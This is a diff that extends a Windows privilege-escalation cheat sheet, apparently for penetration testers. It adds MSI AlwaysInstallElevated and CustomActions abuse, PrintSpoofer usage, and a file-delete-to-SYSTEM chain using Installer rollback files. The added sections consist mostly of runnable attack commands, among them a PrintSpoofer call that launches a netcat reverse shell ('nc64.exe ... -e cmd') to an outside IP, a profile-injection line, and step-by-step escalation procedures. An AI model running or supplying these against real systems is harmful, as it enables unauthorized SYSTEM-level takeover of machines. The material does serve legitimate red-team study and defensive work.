@@ -30,7 +30,9 @@
 * [EoP - $PATH Interception](#eop---path-interception)
 * [EoP - Named Pipes](#eop---named-pipes)
 * [EoP - Kernel Exploitation](#eop---kernel-exploitation)
-* [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
+* [EoP - Microsoft Windows Installer](#eop---microsoft-windows-installer)
+    * [AlwaysInstallElevated](#alwaysinstallelevated)
+    * [CustomActions](#customactions)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Evaluating Vulnerable Drivers](#eop---evaluating-vulnerable-drivers)
 * [EoP - Printers](#eop---printers)
@@ -47,11 +49,13 @@
     * [Juicy Potato (Abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
     * [Rogue Potato (Fake OXID Resolver)](#rogue-potato-fake-oxid-resolver))
     * [EFSPotato (MS-EFSR EfsRpcOpenFileRaw)](#efspotato-ms-efsr-efsrpcopenfileraw))
+    * [PrintSpoofer (Printer Bug)](#PrintSpoofer-Printer-Bug)))
 * [EoP - Privileged File Write](#eop---privileged-file-write)
     * [DiagHub](#diaghub)
     * [UsoDLLLoader](#usodllloader)
     * [WerTrigger](#wertrigger)
     * [WerMgr](#wermgr)
+* [EoP - Privileged File Delete](#eop---privileged-file-delete)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
     * [MS08-067 (NetAPI)](#ms08-067-netapi)
     * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
@@ -837,17 +841,22 @@ To cross compile a program from Kali, use the following command.
 Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
 ```
 
-## EoP - AlwaysInstallElevated
+## EoP - Microsoft Windows Installer
 
-Check if these registry values are set to "1".
+### AlwaysInstallElevated
 
-```powershell
-$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Using the `reg query` command, you can check the status of the `AlwaysInstallElevated` registry key for both the user and the machine. If both queries return a value of `0x1`, then `AlwaysInstallElevated` is enabled for both user and machine, indicating the system is vulnerable.
 
-$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
-$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
-```
+* Shell command
+    ```powershell
+    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    ```
+* PowerShell command
+    ```powershell
+    Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
+    Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
+    ```
 
 Then create an MSI package and install it.
 
@@ -860,6 +869,45 @@ $ msiexec /quiet /qn /i C:\evil.msi
 Technique also available in :
 * Metasploit : `exploit/windows/local/always_install_elevated`
 * PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`
+
+
+### CustomActions
+
+> Custom Actions in MSI allow developers to specify scripts or executables to be run at various points during an installation
+
+* [mgeeky/msidump](https://github.com/mgeeky/msidump) - a tool that analyzes malicious MSI installation packages, extracts files, streams, binary data and incorporates YARA scanner.
+* [activescott/lessmsi](https://github.com/activescott/lessmsi) - A tool to view and extract the contents of an Windows Installer (.msi) file.
+* [mandiant/msi-search](https://github.com/mandiant/msi-search) - This tool simplifies the task for red team operators and security teams to identify which MSI files correspond to which software and enables them to download the relevant file.
+
+Enumerate products on the machine
+
+```ps1
+wmic product get identifyingnumber,name,vendor,version
+```
+
+Execute the repair process with the `/fa` parameter to trigger the CustomActions. 
+We can use both IdentifyingNumber `{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}` or path to the installer `c:\windows\installer\XXXXXXX.msi`.
+The repair will run with the NT SYSTEM account.
+
+```ps1
+$installed = Get-WmiObject Win32_Product
+$string= $installed | select-string -pattern "PRODUCTNAME"
+$string[0] -match '{\w{8}-\w{4}-\w{4}-\w{4}-\w{12}}'
+Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa $($matches[0])"
+```
+
+Common mistakes in MSI installers:
+
+* Missing quiet parameters: it will spawn `conhost.exe` as `NT SYSTEM`. Use `[CTRL]+[A]` to select some text in it, it will pause the execution.
+    * conhost -> properties -> "legacy console mode" Link -> Internet Explorer -> CTRL+O –> cmd.exe
+* GUI with direct actions: open a URL and start the browser then use the same scenario.
+* Binaries/Scripts loaded from user writable paths: you might need to win the race condition.
+* DLL hijacking/search order abusing
+* PowerShell `-NoProfile` missing: Add custom commands into your profile
+    ```ps1
+    new-item -Path $PROFILE -Type file -Force
+    echo "Start-Process -FilePath cmd.exe -Wait;" > $PROFILE
+    ```
 
 
 ## EoP - Insecure GUI apps
@@ -1217,6 +1265,21 @@ JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juic
 ```
 
 
+###  PrintSpoofer (Printer Bug)
+
+> this work if SeImpersonatePrivilege is enabled
+
+* Binary available at https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
+
+```powershell
+# run nc -lnvp 443 then :
+.\PrintSpoofer64.exe -c "C:\Temp\nc64.exe 192.168.45.171 443 -e cmd"
+# without listener
+.\PrintSpoofer64.exe -i -c cmd
+# Via RPD
+.\PrintSpoofer64.exe -d 3 -c "powershell -ep bypass"
+```
+
 ## EoP - Privileged File Write
 
 ### DiagHub
@@ -1277,6 +1340,27 @@ If we found a privileged file write vulnerability in Windows or in some third-pa
 3. Grant access to it: `cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f`
 4. Place `spawn.dll` file and `dircreate2system.exe` in a same directory and run `.\dircreate2system.exe`. 
 5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
+
+
+## EoP - Privileged File Delete
+
+During an MSI installation, the Windows Installer service maintains a record of every changes in case it needs to be rolled back, to do that it will create:
+
+* a folder at `C:\Config.Msi` containing 
+    * a rollback script (`.rbs`) 
+    * a rollback file (`.rbf`)
+
+To convert a privileged file delete to a local privilege escalation, you need to abuse the Windows Installer service.
+* delete the protected `C:\Config.Msi` folder immediately after it's created by the Windows Installer
+* recreate the `C:\Config.Msi` folder with weak DACL permissions since ordinary users are allowed to create folders at the root of `C:\`.
+* drop malicious `.rbs` and `.rbf` files into it to be executed by the MSI rollback
+* then upon rollback, Windows Installer will make arbitrary changes to the system
+
+The easiest way to trigger this chain is using [thezdi/FilesystemEoPs/FolderOrFileDeleteToSystem](https://github.com/thezdi/PoC/tree/master/FilesystemEoPs/FolderOrFileDeleteToSystem).
+The exploit contains a .msi file with 2 actions, the first one produces a delay and the second throws an error to make it rollback. This rollback will "restore" a malicious HID.dll in `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
+
+Then switch to the secure desktop using `[CTRL]+[ALT]+[DELETE]` and open the On-Screen Keyboard (`osk.exe`).
+The `osk.exe` process first looks for the `C:\Program Files\Common Files\microsoft shared\ink\HID.dll` library instead of `C:\Windows\System32\HID.dll`
 
 
 ## EoP - Common Vulnerabilities and Exposure
@@ -1445,3 +1529,8 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
 * [IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_ ](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)
 * [Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
+* [MSIFortune - LPE with MSI Installers - Oct 3, 2023 - PfiatDe](https://badoption.eu/blog/2023/10/03/MSIFortune.html)
+* [MSI Shenanigans. Part 1 – Offensive Capabilities Overview - DECEMBER 8, 2022 - Mariusz Banach](https://mgeeky.tech/msi-shenanigans-part-1/)
+* [Escalating Privileges via Third-Party Windows Installers - ANDREW OLIVEAU - JUL 19, 2023](https://www.mandiant.com/resources/blog/privileges-third-party-windows-installers)
+* [Deleting Your Way Into SYSTEM: Why Arbitrary File Deletion Vulnerabilities Matter - ANDREW OLIVEAU - SEP 11, 2023](https://www.mandiant.com/resources/blog/arbitrary-file-deletion-vulnerabilities)
+* [ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - Simon Zuckerbraun - March 17, 2022 ](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
